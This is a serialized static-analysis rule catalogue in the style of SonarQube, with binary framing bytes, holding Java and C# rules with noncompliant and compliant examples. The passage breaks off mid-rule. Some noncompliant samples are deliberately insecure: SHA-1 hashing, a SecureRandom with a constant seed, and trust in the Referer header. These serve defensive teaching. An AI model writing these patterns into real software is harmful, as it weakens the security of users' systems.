javaS2070NSHA-1 and Message-Digest hash algorithms should not be used in secure contexts"CRITICAL*java:ä<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,
it takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash
value gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,
MD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>
<p>The following APIs are tracked for use of obsolete crypto algorithms:</p>
<p> * <code>java.security.AlgorithmParameters</code> (JDK)</p>
<p> * <code>java.security.AlgorithmParameterGenerator</code> (JDK)</p>
<p> * <code>java.security.MessageDigest</code> (JDK)</p>
<p> * <code>java.security.KeyFactory</code> (JDK)</p>
<p> * <code>java.security.KeyPairGenerator</code> (JDK)</p>
<p> * <code>java.security.Signature</code> (JDK)</p>
<p> * <code>javax.crypto.Mac</code> (JDK)</p>
<p> * <code>javax.crypto.KeyGenerator</code> (JDK)</p>
<p> * <code>org.apache.commons.codec.digest.DigestUtils</code> (Apache Commons Codec)</p>
<p> * <code>com.google.common.hash.Hashing</code> (Guava)</p>
<p> * <code>org.springframework.security.authentication.encoding.ShaPasswordEncoder</code> (Spring Security 4.2.x)</p>
<p> * <code>org.springframework.security.authentication.encoding.Md5PasswordEncoder</code> (Spring Security 4.2.x)</p>
<p> * <code>org.springframework.security.crypto.password.LdapShaPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.Md4PasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.MessageDigestPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.NoOpPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p> * <code>org.springframework.security.crypto.password.StandardPasswordEncoder</code> (Spring Security 5.0.x)</p>
<p>Consider using safer alternatives, such as SHA-256, SHA-3 or adaptive one way functions like bcrypt or PBKDF2.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA1");  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="http://shattered.io/">SHAttered</a> - The first concrete collision attack against SHA-1. </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=squid%3AS4790'>S4790</a>, <a href='/coding_rules#rule_key=squid%3AS5344'>S5344</a> instead.</p>ZVULNERABILITY
ñ

java:S4347á
javaS4347."SecureRandom" seeds should not be predictable"CRITICAL*java:®<p>The <code>java.security.SecureRandom</code> class provides a strong random number generator (RNG) appropriate for cryptography. However, seeding it
with a constant or another predictable value will weaken it significantly. In general, it is much safer to rely on the seed provided by the
<code>SecureRandom</code> implementation.</p>
<p>This rule raises an issue when <code>SecureRandom.setSeed()</code> or <code>SecureRandom(byte[])</code> are called with a seed that is either
of:</p>
<ul>
  <li> a constant </li>
  <li> <code>System.currentTimeMillis()</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
SecureRandom sr = new SecureRandom();
sr.setSeed(123456L); // Noncompliant
int v = sr.next(32);

sr = new SecureRandom("abcdefghijklmnop".getBytes("us-ascii")); // Noncompliant
v = sr.next(32);
</pre>
<h2>Compliant Solution</h2>
<pre>
SecureRandom sr = new SecureRandom();
int v = sr.next(32);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/330.html">MITRE, CWE-330</a> - Use of Insufficiently Random Values </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/332.html">MITRE, CWE-332</a> - Insufficient Entropy in PRNG </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/336.html">MITRE, CWE-336</a> - Same Seed in Pseudo-Random Number Generator (PRNG) </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/337.html">MITRE, CWE-337</a> - Predictable Seed in Pseudo-Random Number Generator (PRNG) </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC63-J.+Ensure+that+SecureRandom+is+properly+seeded">CERT, MSC63J.</a> - Ensure that
  SecureRandom is properly seeded </li>
</ul>ZVULNERABILITY
”

java:S3252ƒ
javaS3252D"static" base class members should not be accessed via derived types"CRITICAL*java:“<p>In the interest of code clarity, <code>static</code> members of a <code>base</code> class should never be accessed using a derived type's name.
Doing so is confusing and could create the illusion that two different static members exist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Parent {
  public static int counter;
}

class Child extends Parent {
  public Child() {
    Child.counter++;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Parent {
  public static int counter;
}

class Child extends Parent {
  public Child() {
    Parent.counter++;
  }
}
</pre>Z
CODE_SMELL
ï

java:S1192Ü
javaS1192(String literals should not be duplicated"CRITICAL*java:∞
<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>
<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
public void run() {
  prepare("action1");                              // Noncompliant - "action1" is duplicated 3 times
  execute("action1");
  release("action1");
}

@SuppressWarning("all")                            // Compliant - annotations are excluded
private void method1() { /* ... */ }
@SuppressWarning("all")
private void method2() { /* ... */ }

public String method3(String a) {
  System.out.println("'" + a + "'");               // Compliant - literal "'" has less than 5 characters and is excluded
  return "";                                       // Compliant - literal "" has less than 5 characters and is excluded
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private static final String ACTION_1 = "action1";  // Compliant

public void run() {
  prepare(ACTION_1);                               // Compliant
  execute(ACTION_1);
  release(ACTION_1);
}
</pre>
<h2>Exceptions</h2>
<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>Z
CODE_SMELL
ç

java:S2057˛
javaS20577"Serializable" classes should have a "serialVersionUID""CRITICAL*java:ô<p>A <code>serialVersionUID</code> field is strongly recommended in all <code>Serializable</code> classes. If you do not provide one, one will be
calculated for you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an
entirely new id, and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the
class.</p>
<p><code>serialVersionUID</code>'s should be declared with all of these modifiers: <code>static final long</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Raspberry extends Fruit  // Noncompliant; no serialVersionUID.
        implements Serializable {
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}

public class Raspberry extends Fruit
        implements Serializable {
  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Raspberry extends Fruit
        implements Serializable {
  private static final long serialVersionUID = 1;
  private String variety;

  public Raspberry(Season ripe, String variety) { ...}
  public void setVariety(String variety) {...}
  public String getVarity() {...}
}
</pre>
<h2>Exceptions</h2>
<p>Swing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and <code>Error</code>s),
and classes marked with <code>@SuppressWarnings("serial")</code> are ignored.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYCpAQ">CERT, SER00-J.</a> - Enable serialization compatibility during class evolution
  </li>
</ul>Z
CODE_SMELL
¢

java:S2176ì
javaS21768Class names should not shadow interfaces or superclasses"CRITICAL*java:≠<p>While it's perfectly legal to give a class the same simple name as a class in another package that it extends or interface it implements, it's
confusing and could cause problems in the future. </p>
<h2>Noncompliant Code Example</h2>
<pre>
package my.mypackage;

public class Foo implements a.b.Foo { // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
package my.mypackage;

public class FooJr implements a.b.Foo {
</pre>Z
CODE_SMELL
¥


java:S2089•

javaS2089%HTTP referers should not be relied on"CRITICAL*java:œ	<p>The fields in an HTTP request are putty in the hands of an attacker, and you cannot rely on them to tell you the truth about anything. While it may
be safe to store such values after they have been neutralized, decisions should never be made based on their contents.</p>
<p>This rule flags uses of the referer header field.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyServlet extends HttpServlet {
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    String referer = request.getHeader("referer");  // Noncompliant
    if(isTrustedReferer(referer)){
      //..
    }
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/293">MITRE, CWE-293</a> - Using Referer Field for Authentication </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
˘
	java:S888Î
javaS888JEquality operators should not be used in "for" loop termination conditions"CRITICAL*java:Ù
<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an
infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an
infinite loop.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (int i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 1; i &lt;= 10; i += 2)  // Compliant
{
  //...
}
</pre>
<h2>Exceptions</h2>
<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li> starts below the ending value and is incremented by 1 on each iteration. </li>
  <li> starts above the ending value and is decremented by 1 on each iteration. </li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (int i = 0; arr[i] != null; i++) {
  // ...
}

for (int i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition ('Infinite Loop') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/EwDJAQ">CERT, MSC21-C.</a> - Use robust loop termination conditions </li>
</ul>Z
CODE_SMELL
ö

java:S5128ã
javaS51289"Bean Validation" (JSR 380) should be properly configured"CRITICAL*java:§<p><code>Bean Validation</code> as per defined by JSR 380 can be triggered programmatically or also executed by the <code>Bean Validation</code>
providers. However something should tell the <code>Bean Validation</code> provider that a variable must be validated otherwise no validation will
happen. This can be achieved by annotating a variable with <code>javax.validation.Valid</code> and unfortunally it's easy to forget to add this
annotation on complex Beans.</p>
<p>Not annotating a variable with <code>@Valid</code> means <code>Bean Validation</code> will not be triggered for this variable, but readers may
overlook this omission and assume the variable will be validated.</p>
<p>This rule will run by default on all <code>Class</code>'es and therefore can generate a lot of noise. This rule should be restricted to run only on
certain layers. For this reason, the "Restrict Scope of Coding Rules" feature should be used to check for missing <code>@Valid</code> annotations only
on some packages of the application.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import javax.validation.Valid;
import javax.validation.constraints.NotNull;

public class User {
  @NotNull
  private String name;
}

public class Group {
  @NotNull
  private List&lt;User&gt; users; // Noncompliant; User instances are not validated
}

public class MyService {
  public void login(User user) { // Noncompliant; parameter "user" is not validated
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import javax.validation.Valid;
import javax.validation.constraints.NotNull;

public class User {
  @NotNull
  private String name;
}

public class Group {
  @Valid
  @NotNull
  private List&lt;User&gt; users; // Compliant; User instances are validated

  @NotNull
  // preferred style as of Bean Validation 2.0
  private List&lt;@Valid User&gt; users2; // Compliant; User instances are validated
}

public class MyService {
  public void login(@Valid User user) { // Compliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://beanvalidation.org/2.0/spec/">Bean Validation 2.0 (JSR 380)</a> </li>
</ul>Z
CODE_SMELL
Ú

java:S5361„
javaS5361;"String#replace" should be preferred to "String#replaceAll""CRITICAL*java:˙
<p>The underlying implementation of <code>String::replaceAll</code> calls the <code>java.util.regex.Pattern.compile()</code> method each time it is
called even if the first argument is not a regular expression. This has a significant performance cost and therefore should be used with care.</p>
<p>When <code>String::replaceAll</code> is used, the first argument should be a real regular expression. If it‚Äôs not the case,
<code>String::replace</code> does exactly the same thing as <code>String::replaceAll</code> without the performance drawback of the regex.</p>
<p>This rule raises an issue for each <code>String::replaceAll</code> used with a <code>String</code> as first parameter which doesn‚Äôt contains
special regex character or pattern.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String init = "Bob is a Bird... Bob is a Plane... Bob is Superman!";
String changed = init.replaceAll("Bob is", "It's"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String init = "Bob is a Bird... Bob is a Plane... Bob is Superman!";
String changed = init.replace("Bob is", "It's");
</pre>
<p>Or, with a regex:</p>
<pre>
String init = "Bob is a Bird... Bob is a Plane... Bob is Superman!";
String changed = init.replaceAll("\\w*\\sis", "It's");
</pre>
<h2>See</h2>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS4248'>S4248</a> - Regex patterns should not be created needlessly </li>
</ul>Z
CODE_SMELL
†	

java:S4275ë	
javaS42755Getters and setters should access the expected fields"CRITICAL*java:µ<p>Getters and setters provide a way to enforce encapsulation by providing <code>public</code> methods that give controlled access to
<code>private</code> fields. However in classes with multiple fields it is not unusual that copy and paste is used to quickly create the needed
getters and setters, which can result in the wrong field being accessed by a getter or setter.</p>
<p>This rule raises an issue in any of these cases:</p>
<ul>
  <li> A setter does not update the field with the corresponding name. </li>
  <li> A getter does not access the field with the corresponding name. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  private int x;
  private int y;

  public void setX(int val) { // Noncompliant: field 'x' is not updated
    this.y = val;
  }

  public int getY() { // Noncompliant: field 'y' is not used in the return value
    return this.x;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  private int x;
  private int y;

  public void setX(int val) {
    this.x = val;
  }

  public int getY() {
    return this.y;
  }
}
</pre>ZBUG
∆

java:S2093∑
javaS2093!Try-with-resources should be used"CRITICAL*java:Ë<p>Java 7 introduced the try-with-resources statement, which guarantees that the resource in question will be closed. Since the new syntax is closer
to bullet-proof, it should be preferred over the older <code>try</code>/<code>catch</code>/<code>finally</code> version.</p>
<p>This rule checks that <code>close</code>-able resources are opened in a try-with-resources statement.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileReader fr = null;
BufferedReader br = null;
try {
  fr = new FileReader(fileName);
  br = new BufferedReader(fr);
  return br.readLine();
} catch (...) {
} finally {
  if (br != null) {
    try {
      br.close();
    } catch(IOException e){...}
  }
  if (fr != null ) {
    try {
      br.close();
    } catch(IOException e){...}
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
try (
    FileReader fr = new FileReader(fileName);
    BufferedReader br = new BufferedReader(fr)
  ) {
  return br.readLine();
}
catch (...) {}
</pre>
<p>or</p>
<pre>
try (BufferedReader br =
        new BufferedReader(new FileReader(fileName))) { // no need to name intermediate resources if you don't want to
  return br.readLine();
}
catch (...) {}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/MACfBg">CERT, ERR54-J.</a> - Use a try-with-resources statement to safely handle
  closeable resources </li>
</ul>Z
CODE_SMELL
¢
csharpsquid:S2346å
csharpsquidS2346<Flags enumerations zero-value members should be named "None""CRITICAL*cs:ù<p>Consistent use of "None" in flags enumerations indicates that all flag values are cleared. The value 0 should not be used to indicate any other
state, since there is no way to check that the bit <code>0</code> is set.</p>
<h2>Noncompliant Code Example</h2>
<pre>
[Flags]
enum FruitType
{
    Void = 0,        // Non-Compliant
    Banana = 1,
    Orange = 2,
    Strawberry = 4
}
</pre>
<h2>Compliant Solution</h2>
<pre>
[Flags]
enum FruitType
{
    None = 0,        // Compliant
    Banana = 1,
    Orange = 2,
    Strawberry = 4
}
</pre>Z
CODE_SMELL
–
csharpsquid:S2223∫
csharpsquidS22230Non-constant static fields should not be visible"CRITICAL*cs:◊<p>A <code>static</code> field that is neither constant nor read-only is not thread-safe. Correctly accessing these fields from different threads
needs synchronization with <code>lock</code>s. Improper synchronization may lead to unexpected results, thus publicly visible static fields are best
suited for storing non-changing data shared by many consumers. To enforce this intent, these fields should be marked <code>readonly</code> or
converted to constants.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Math
{
  public static double Pi = 3.14;  // Noncompliant
}
</pre>
<p>or</p>
<pre>
public class Shape
{
  public static Shape Empty = new EmptyShape();  // Noncompliant

  private class EmptyShape : Shape
  {
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Math
{
  public const double Pi = 3.14;
}
</pre>
<p>or</p>
<pre>
public class Shape
{
  public static readonly Shape Empty = new EmptyShape();

  private class EmptyShape : Shape
  {
  }
}
</pre>Z
CODE_SMELL
…
csharpsquid:S4524≥
csharpsquidS4524)"default" clauses should be first or last"CRITICAL*cs:◊<p><code>switch</code> can contain a <code>default</code> clause for various reasons: to handle unexpected values, to show that all the cases were
properly considered.</p>
<p>For readability purpose, to help a developer to quickly find the default behavior of a <code>switch</code> statement, it is recommended to put the
<code>default</code> clause at the end of the <code>switch</code> statement. This rule raises an issue if the <code>default</code> clause is not the
first or the last one of the <code>switch</code>'s cases.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (param)
{
    case 0:
      DoSomething();
      break;
    default: // default clause should be the first or last one
      Error();
      break;
    case 1:
      DoSomethingElse();
      break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (param)
{
    case 0:
      DoSomething();
      break;
    case 1:
      DoSomethingElse();
      break;
    default:
      Error();
      break;
}
</pre>Z
CODE_SMELL
õ
csharpsquid:S3447Ö
csharpsquidS3447<"[Optional]" should not be used on "ref" or "out" parameters"CRITICAL*cs:ñ
<p>The use of <code>ref</code> or <code>out</code> in combination with <code>[Optional]</code> is both confusing and contradictory.
<code>[Optional]</code> indicates that the parameter doesn't have to be provided, while <code>out</code> and <code>ref</code> mean that the parameter
will be used to return data to the caller (<code>ref</code> additionally indicates that the parameter may also be used to pass data into the
method).</p>
<p>Thus, making it <code>[Optional]</code> to provide the parameter in which you will be passing back the method results doesn't make sense. In fact,
the compiler will raise an error on such code. Unfortunately, it raises the error on method calls where the <code>[Optional]</code> parameter has been
omitted, not the source of the problem, the method declaration. </p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass
{
    public void DoStuff([Optional] ref int i) // Noncompliant
    {
        Console.WriteLine(i);
    }

    public static void Main()
    {
        new MyClass().DoStuff(); // This doesn't compile, CS7036 shows
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass
{
  public void DoStuff(ref int i)
  {
    Console.WriteLine(i);
  }

  public static void Main()
  {
    var i = 42;
    new MyClass().DoStuff(ref i);
  }
}
</pre>Z
CODE_SMELL
∂
csharpsquid:S2479†
csharpsquidS2479GWhitespace and control characters in string literals should be explicit"CRITICAL*cs:¶<p>Non-encoded control characters and whitespace characters are often injected in the source code because of a bad manipulation. They are either
invisible or difficult to recognize, which can result in bugs when the string is not what the developer expects. If you actually need to use a control
character use their encoded version (ex: ASCII <code>\n,\t,</code>... or Unicode <code>U+000D, U+0009,</code>...).</p>
<p>This rule raises an issue when the following characters are seen in a literal string:</p>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/ASCII#Control_characters">ASCII control character</a>. (character index &lt; 32 or = 127) </li>
  <li> Unicode <a href="https://en.wikipedia.org/wiki/Unicode_character_property#Whitespace">whitespace characters</a>. </li>
  <li> Unicode <a href="https://en.wikipedia.org/wiki/C0_and_C1_control_codes">C0 control characters</a> </li>
  <li> Unicode characters <code>U+200B, U+200C, U+200D, U+2060, U+FEFF, U+2028, U+2029</code> </li>
</ul>
<p>No issue will be raised on the simple space character. Unicode <code>U+0020</code>, ASCII 32.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string tabInside = "A	B";  // Noncompliant, contains a tabulation
string zeroWidthSpaceInside = "foo‚Äãbar"; // Noncompliant, it contains a U+200B character inside
Console.WriteLine(zeroWidthSpaceInside); // Prints "foo?bar"
</pre>
<h2>Compliant Solution</h2>
<pre>
string tabInside = "A\tB";  // Compliant, uses escaped value
string zeroWidthSpaceInside = "foo\u200Bbar";  // Compliant, uses escaped value
Console.WriteLine(zeroWidthSpaceInside); // Prints "foo?bar"
</pre>
<h2>Exceptions</h2>
<p>Verbatim string literals have no escape character mechanism.</p>Z
CODE_SMELL
·
csharpsquid:S1944À
csharpsquidS1944&Inappropriate casts should not be made"CRITICAL*cs:Ú<p>Inappropriate casts are issues that will lead to unexpected behavior or runtime errors, such as <code>InvalidCastException</code>s. The compiler
will catch bad casts from one class to another, but not bad casts to interfaces. Nor will it catch nullable values that are known to be null but that
are cast to their underlying value types anyway.</p>
<p>It is much better to use the <code>as</code> operator because it will return <code>null</code> instead of throwing an exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public interface IMyInterface
{ /* ... */ }

public class Implementer : IMyInterface
{ /* ... */ }

public class MyClass
{ /* ... */ }

public static class Program
{
  public static void Main()
  {
    var myclass = new MyClass();
    var x = (IMyInterface) myclass; // Noncompliant, InvalidCastException is being thrown
    var b = myclass is IMyInterface; // Noncompliant, always false

    int? i = null;
    var ii = (int)i; // Noncompliant, InvalidOperationException is being thrown
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public interface IMyInterface
{ /* ... */ }

public class Implementer : IMyInterface
{ /* ... */ }

public class MyClass
{ /* ... */ }

public static class Program
{
  public static void Main()
  {
    var myclass = new MyClass();
    var x = myclass as IMyInterface; // Compliant, but will always be null
    var b = false;

    int? i = null;
    if (i.HasValue)
    {
      var ii = (int)i;
    }
  }
}
</pre>
<h2>Exceptions</h2>
<p>No issue is reported if the interface has no implementing class in the assembly.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/tgAV">CERT, EXP36-C.</a> - Do not cast pointers into more strictly aligned pointer
  types </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/588.html">MITRE, CWE-588</a> - Attempt to Access Child of a Non-structure Pointer </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/704.html">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast </li>
</ul>Z
CODE_SMELL
µ
csharpsquid:S1821ü
csharpsquidS1821("switch" statements should not be nested"CRITICAL*cs:ƒ<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>Z
CODE_SMELL
ß
csharpsquid:S3449ë
csharpsquidS34494Right operands of shift operators should be integers"CRITICAL*cs:±<p>Numbers can be shifted with the <code>&lt;&lt;</code> and <code>&gt;&gt;</code> operators, but the right operand of the operation needs to be an
<code>int</code> or a type that has an implicit conversion to <code>int</code>. However, with <code>dynamic</code>, the compiler's type checking is
turned off, so you can pass anything to a shift operator and have it compile. And if the argument can't be converted to <code>int</code> at runtime,
then a <code>RuntimeBinderException</code> will be raised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
dynamic d = 5;
var x = d &gt;&gt; 5.4; // Noncompliant
x = d &gt;&gt; null; // Noncompliant
x &lt;&lt;= new object(); // Noncompliant
</pre>ZBUG
Ø
csharpsquid:S3776ô
csharpsquidS37766Cognitive Complexity of methods should not be too high"CRITICAL*cs:∞<p>Cognitive Complexity is a measure of how hard the control flow of a method is to understand. Methods with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://redirect.sonarsource.com/doc/cognitive-complexity.html">Cognitive Complexity</a> </li>
</ul>Z
CODE_SMELL
’
csharpsquid:S5034ø
csharpsquidS5034("ValueTask" should be consumed correctly"CRITICAL*cs:‰<p><code>ValueTask&lt;TResult&gt;</code> was introduced in .NET Core 2.0 <a
href="https://devblogs.microsoft.com/dotnet/understanding-the-whys-whats-and-whens-of-valuetask/">to optimize memory allocation</a> when functions
return their results synchronously.</p>
<p><code>ValueTask</code> and <code>ValueTask&lt;TResult&gt;</code> should <strong>never</strong> be used in the following ways as it could result in
a race condition:</p>
<ul>
  <li> Calling <code>await</code> multiple times on a <code>ValueTask / ValueTask&lt;TResult&gt;</code>*. The wrapped object may have been reused by
  another operation. This differs from <code>Task / Task&lt;TResult&gt;</code>, on which you can await multiple times and always get the same result.
  </li>
  <li> Calling <code>await</code> concurrently on a <code>ValueTask / ValueTask&lt;TResult&gt;</code>*. The underlying object is not thread safe.
  What's more, it has the same effect as awaiting multiple times a <code>ValueTask / ValueTask&lt;TResult&gt;</code>. This again differs from
  <code>Task / Task&lt;TResult&gt;</code>, which support concurrent <code>await</code>. </li>
  <li> Using <code>.Result</code> or <code>.GetAwaiter().GetResult()</code> without checking if the operation completed*. <code>IValueTaskSource /
  IValueTaskSource&lt;TResult&gt;</code> implementations are not required to block until the operation completes. On the other hand, <code>Task /
  Task&lt;TResult&gt;</code> blocks the call until the task completes. </li>
</ul>
<p>It is recommended to use <code>ValueTask / ValueTask&lt;TResult&gt;</code> either by calling "await" on the function returning it, optionally
calling <code>ConfigureAwait(false)</code> on it, or by calling <code>.AsTask()</code> on it.</p>
<p>This rule raises an issue when the following operations are performed on a <code>ValueTask / ValueTask&lt;TResult&gt;</code> instance:</p>
<ul>
  <li> Awaiting the instance multiple times. </li>
  <li> Calling <code>AsTask</code> multiple times. </li>
  <li> Using <code>.Result</code> or <code>.GetAwaiter().GetResult()</code> multiple times </li>
  <li> Using <code>.Result</code> or <code>.GetAwaiter().GetResult()</code> when the operation has not yet completed </li>
  <li> Using more than one of these ways to consume the instance. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
ValueTask&lt;int&gt; vt = SomeValueTaskReturningMethodAsync();
int result = await vt;
int result2 = await vt; // Noncompliant, variable is awaited multiple times

int value = SomeValueTaskReturningMethodAsync().GetAwaiter().GetResult(); // Noncompliant, uses GetAwaiter().GetResult() when it's not known to be done
</pre>
<h2>Compliant Solution</h2>
<pre>
int result = await SomeValueTaskReturningMethodAsync();

int result = await SomeValueTaskReturningMethodAsync().ConfigureAwait(false);

Task&lt;int&gt; t = SomeValueTaskReturningMethodAsync().AsTask();
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise any issue when a <code>ValueTask / ValueTask&lt;TResult&gt;</code> is awaited multiple time in a loop.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.microsoft.com/en-us/dotnet/api/system.threading.tasks.valuetask-1">ValueTask&lt;TResult&gt; official documentation</a>
  </li>
  <li> <a href="https://blogs.msdn.microsoft.com/dotnet/2018/11/07/understanding-the-whys-whats-and-whens-of-valuetask/">Understanding the Whys,
  Whats, and Whens of ValueTask</a> </li>
</ul>Z
CODE_SMELL
ó

csharpsquid:S4635Å

csharpsquidS4635SString offset-based methods should be preferred for finding substrings from offsets"CRITICAL*cs:˚<p>Looking for a given substring starting from a specified offset can be achieved by such code: <code>str.Substring(startIndex).IndexOf(char1)</code>.
This works well, but it creates a new <code>string</code> for each call to the <code>Substring</code> method. When this is done in a loop, a lot of
<code>strings</code> are created for nothing, which can lead to performance problems if <code>str</code> is large.</p>
<p>To avoid performance problems, <code>string.Substring(startIndex)</code> should not be chained with the following methods:</p>
<p>- <code>IndexOf</code></p>
<p>- <code>IndexOfAny</code></p>
<p>- <code>LastIndexOf</code></p>
<p>- <code>LastIndexOfAny</code></p>
<p>For each of these methods, another method with an additional parameter is available to specify an offset.</p>
<p>Using these methods gives the same result while avoiding the creation of additional <code>String</code> instances.</p>
<h2>Noncompliant Code Example</h2>
<pre>
str.Substring(StartIndex).IndexOf(char1); // Noncompliant; a new string is going to be created by "Substring"
</pre>
<h2>Compliant Solution</h2>
<pre>
str.IndexOf(char1, startIndex);
</pre>Z
CODE_SMELL
ˆ
csharpsquid:S2696‡
csharpsquidS26964Instance members should not write to "static" fields"CRITICAL*cs:˘<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple
class instances and/or multiple threads in play. </p>
<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method or property.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  private static int count = 0;

  public void DoSomething()
  {
    //...
    count++;  // Noncompliant
  }
}
</pre>Z
CODE_SMELL
“
csharpsquid:S2330º
csharpsquidS2330#Array covariance should not be used"CRITICAL*cs:Ê<p>Array covariance is the principle that if an implicit or explicit reference conversion exits from type <code>A</code> to <code>B</code>, then the
same conversion exists from the array type <code>A[]</code> to <code>B[]</code>.</p>
